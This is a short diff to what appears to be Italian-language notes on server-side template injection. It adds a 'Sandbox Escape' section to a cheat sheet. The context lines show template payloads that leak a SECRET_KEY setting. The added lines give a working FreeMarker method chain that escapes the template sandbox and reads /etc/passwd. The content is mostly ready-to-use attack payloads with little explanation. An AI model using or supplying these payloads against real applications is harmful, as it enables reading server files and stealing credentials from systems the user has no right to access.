@@ -74,3 +74,19 @@ Ciao, funziona!{{#with "s" as |string|}}
 (Es. SECRET_KEY: valore segreto che potrebbe contenere chiavi autenticative)
 {{settings.SECRET_KEY}}
 ```
+
+## More
+...
+
+# Sandbox Escape
+Relativamente al linguaggio usato, deve essere codificata una chain di metodi in grado di ottemperare la nostro scopo bypassando le protenzioni della standbox. 
+
+## FreeMarker (Java)
+* read file (output: hex):
+```
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+```
+
+
+
+
